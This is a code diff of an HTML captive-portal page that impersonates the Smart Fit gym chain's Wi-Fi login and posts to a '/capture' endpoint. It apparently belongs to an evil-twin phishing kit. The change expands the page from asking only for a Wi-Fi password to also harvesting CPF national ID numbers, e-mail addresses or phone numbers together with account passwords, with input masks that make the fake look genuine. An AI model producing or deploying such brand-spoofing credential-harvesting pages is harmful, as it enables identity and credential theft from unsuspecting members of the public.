@@ -2,54 +2,86 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-<meta name="robots" content="noindex, nofollow">
-<title>SmartFit - Wi-Fi</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Smart Fit - Wi-Fi</title>
 <style>
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-html { font-size: 16px; }
-body { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #111111; color: #FFFFFF; padding: 16px; }
-.card { background: #1A1A1A; border-radius: 12px; padding: 32px 28px; width: 100%; max-width: 400px; box-shadow: 0 4px 24px rgba(0,0,0,0.5); border-top: 3px solid #FFE000; }
-.logo { text-align: center; margin-bottom: 24px; font-size: 28px; font-weight: 900; letter-spacing: -0.5px; }
-.logo .smart { color: #FFFFFF; }
-.logo .fit { color: #FFE000; }
-.subtitle { text-align: center; color: #AAAAAA; font-size: 14px; margin-bottom: 28px; line-height: 1.5; }
-.form-group { margin-bottom: 16px; }
-label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #FFFFFF; }
-input[type="password"], input[type="email"], input[type="text"] { width: 100%; padding: 13px 16px; border: 1.5px solid #333333; border-radius: 8px; font-size: 15px; background: #111111; color: #FFFFFF; outline: none; transition: border-color 0.2s; }
-input:focus { border-color: #FFE000; }
-button[type="submit"] { width: 100%; padding: 14px; background: #FFE000; color: #111111; border: none; border-radius: 8px; font-size: 16px; font-weight: 900; cursor: pointer; margin-top: 8px; transition: opacity 0.2s; letter-spacing: 0.5px; }
-button:hover { opacity: 0.92; }
-.footer { text-align: center; margin-top: 20px; font-size: 11px; color: #666; }
-input[type="hidden"] { display: none; }
-@media (max-width: 480px) { .card { padding: 24px 18px; } .logo { font-size: 24px; } }
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{min-height:100vh;background:#111;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;padding:16px}
+.card{width:100%;max-width:400px}
+.logo-wrap{text-align:center;margin-bottom:28px}
+.logo-box{display:inline-flex;align-items:center;background:#1a1a1a;border:2px solid #FFE000;border-radius:6px;padding:10px 20px;gap:0}
+.logo-smart{font-size:26px;font-weight:900;color:#fff;letter-spacing:-0.5px;font-family:sans-serif}
+.logo-fit{font-size:26px;font-weight:900;color:#FFE000;letter-spacing:-0.5px}
+.tagline{color:#888;font-size:13px;margin-top:10px;text-align:center}
+.tabs{display:flex;gap:3px;background:#222;padding:4px;border-radius:8px;margin-bottom:20px}
+.tab{flex:1;padding:10px 4px;background:transparent;border:none;color:#888;font-size:13px;font-weight:700;cursor:pointer;border-radius:5px;transition:all .2s;text-align:center}
+.tab.active{background:#FFE000;color:#111}
+.tab-pane{display:none}
+.tab-pane.active{display:block}
+label{display:block;font-size:12px;font-weight:700;color:#888;text-transform:uppercase;letter-spacing:.8px;margin-bottom:7px}
+input{width:100%;background:#1a1a1a;border:1.5px solid #333;border-radius:6px;padding:14px 16px;font-size:15px;color:#fff;outline:none;margin-bottom:18px;transition:border-color .2s}
+input:focus{border-color:#FFE000}
+input::placeholder{color:#555}
+.btn{width:100%;padding:15px;background:#FFE000;color:#111;border:none;border-radius:6px;font-size:17px;font-weight:900;cursor:pointer;letter-spacing:.3px;transition:opacity .2s}
+.btn:hover{opacity:.9}
+.footer{text-align:center;margin-top:18px;font-size:11px;color:#555}
+@media(max-width:480px){.logo-smart,.logo-fit{font-size:22px}}
 </style>
 </head>
 <body>
 <div class="card">
-  <div class="logo"><span class="smart">Smart</span><span class="fit">Fit</span></div>
-  <p class="subtitle">Conecte-se ao Wi-Fi da Smart Fit. Treine conectado!</p>
+  <div class="logo-wrap">
+    <div class="logo-box"><span class="logo-smart">Smart</span><span class="logo-fit">Fit</span></div>
+    <div class="tagline">Conecte-se e treine mais forte</div>
+  </div>
+  <div class="tabs">
+    <button class="tab active" onclick="sfSwitch('cpf',this)">CPF</button>
+    <button class="tab" onclick="sfSwitch('email',this)">E-mail</button>
+    <button class="tab" onclick="sfSwitch('phone',this)">Celular</button>
+  </div>
   <form action="/capture" method="POST" autocomplete="off">
     <input type="hidden" name="csrf_token" value="">
     <input type="hidden" name="portal_id" value="smart_fit">
-    <div class="form-group">
-      <label for="password">Senha do Wi-Fi</label>
-      <input type="password" name="password" id="password" placeholder="Digite a senha" required minlength="8" maxlength="63" autocomplete="new-password">
+    <input type="hidden" name="login_method" id="sfmethod" value="cpf">
+    <div class="tab-pane active" id="sfpane-cpf">
+      <label>CPF</label>
+      <input type="text" name="cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" oninput="maskCPF(this)" autocomplete="off">
     </div>
-    <button type="submit">CONECTAR</button>
+    <div class="tab-pane" id="sfpane-email">
+      <label>E-mail</label>
+      <input type="email" name="email" placeholder="seu@email.com" autocomplete="off">
+    </div>
+    <div class="tab-pane" id="sfpane-phone">
+      <label>Celular</label>
+      <input type="text" name="phone" placeholder="(00) 00000-0000" maxlength="15" inputmode="numeric" oninput="maskPhone(this)" autocomplete="off">
+    </div>
+    <label>Senha</label>
+    <input type="password" name="password" placeholder="Sua senha" required minlength="6" maxlength="64" autocomplete="new-password">
+    <button class="btn" type="submit">Conectar ao Wi-Fi</button>
   </form>
-  <p class="footer">Wi-Fi disponivel em todas as unidades Smart Fit</p>
+  <p class="footer">Wi-Fi disponivel em todas as unidades Smart Fit. Bons treinos!</p>
 </div>
 <script>
-(function(){
-  var lang = navigator.language || 'pt-BR';
-  if (lang.startsWith('en')) {
-    document.querySelector('.subtitle').textContent = 'Connect to Smart Fit Wi-Fi. Train connected!';
-    document.querySelector('button[type=submit]').textContent = 'CONNECT';
-    document.querySelector('.footer').textContent = 'Wi-Fi available at all Smart Fit locations';
-    document.querySelector('label[for=password]').textContent = 'Wi-Fi Password';
-  }
-})();
+function sfSwitch(t,btn){
+  document.querySelectorAll('.tab-pane').forEach(function(e){e.classList.remove('active')});
+  document.querySelectorAll('.tab').forEach(function(e){e.classList.remove('active')});
+  document.getElementById('sfpane-'+t).classList.add('active');
+  btn.classList.add('active');
+  document.getElementById('sfmethod').value=t;
+}
+function maskCPF(el){
+  var v=el.value.replace(/\D/g,'').slice(0,11);
+  if(v.length>9)v=v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/,'$1.$2.$3-$4');
+  else if(v.length>6)v=v.replace(/(\d{3})(\d{3})(\d{1,3})/,'$1.$2.$3');
+  else if(v.length>3)v=v.replace(/(\d{3})(\d{1,3})/,'$1.$2');
+  el.value=v;
+}
+function maskPhone(el){
+  var v=el.value.replace(/\D/g,'').slice(0,11);
+  if(v.length>6)v=v.replace(/(\d{2})(\d{4,5})(\d{4})/,'($1) $2-$3');
+  else if(v.length>2)v=v.replace(/(\d{2})(\d+)/,'($1) $2');
+  el.value=v;
+}
 </script>
 </body>
 </html>
